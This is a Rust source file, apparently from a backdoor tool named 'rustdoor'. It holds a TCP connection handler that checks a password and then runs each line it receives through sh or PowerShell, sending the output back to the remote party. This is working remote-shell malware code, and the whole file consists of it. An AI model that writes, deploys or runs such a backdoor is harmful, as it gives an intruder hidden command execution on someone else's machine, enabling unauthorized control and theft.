use std::io::{BufReader, BufWriter, BufRead, Write};
use std::process::Command;
use std::net::TcpStream;
use std::io::Result;
use std::thread;
use std::env;

static PROMPT :&str = "\n$: ";

pub fn help<'a>() -> &'a str {
"
Usage: ./rustdoor [IP:PORT] [PASSWORD]
"
}

fn has_error<T>(result :Result<T>) -> bool {
	match result {
		Ok(_v) => false,
		Err(_e) => true,
	}
}

pub fn con_handler(stream :TcpStream, pass :String) {
	thread::spawn(move || {

		let mut buffer :String = String::new();
		let mut reader = BufReader::new(&stream);
		let mut writer = BufWriter::new(&stream);

		// Login process
		if has_error(writer.write(b"Password: ")) {
			return;
		}

		if has_error(writer.flush()) {
			return;
		}

		if has_error(reader.read_line(&mut buffer)) {
			return;
		}

		if buffer.trim() != pass {
			println!("{} - failed login", &stream.peer_addr().unwrap());
			return;
		}

		// Main loop
		loop {
			let mut buffer :String = String::new();
			// Send the prompt
			if has_error(writer.write(PROMPT.as_bytes())) {
				eprintln!("Could not send prompt! Exiting...");
				return;
			}
			writer.flush().unwrap_or(());

			// Read the input
			if has_error(reader.read_line(&mut buffer)) {
				eprintln!("Could not read input! Exiting...");
				return;
			}

			// TODO: Make an interactive terminal

			let args :[&str; 3];

			// OS detection to determine shell
			if env::consts::OS == "windows" {
				// Use powershell.exe for windows
				args = [ "powershell.exe", "-C", buffer.trim() ];
			} else {
				// Use /bin/sh for linux
				args = [ "sh", "-c", buffer.trim() ];
			}
			println!("{:?}", args);
			// Execute the command
			let child = match Command::new(&args[0]).args(&args[1..]).output() {
				Ok(v) => v,
				Err(e) => {
					match &writer.write(e.to_string().as_bytes()) {
						Ok(_v) => {},
						Err(_e) => {},
					}
					continue
				}
			};

			// Get stdout, stderr and status
			if has_error(writer.write(&child.stdout)) { eprintln!("Could not get output. Resuming..."); }
			writer.flush().unwrap_or(());

		}
	});
}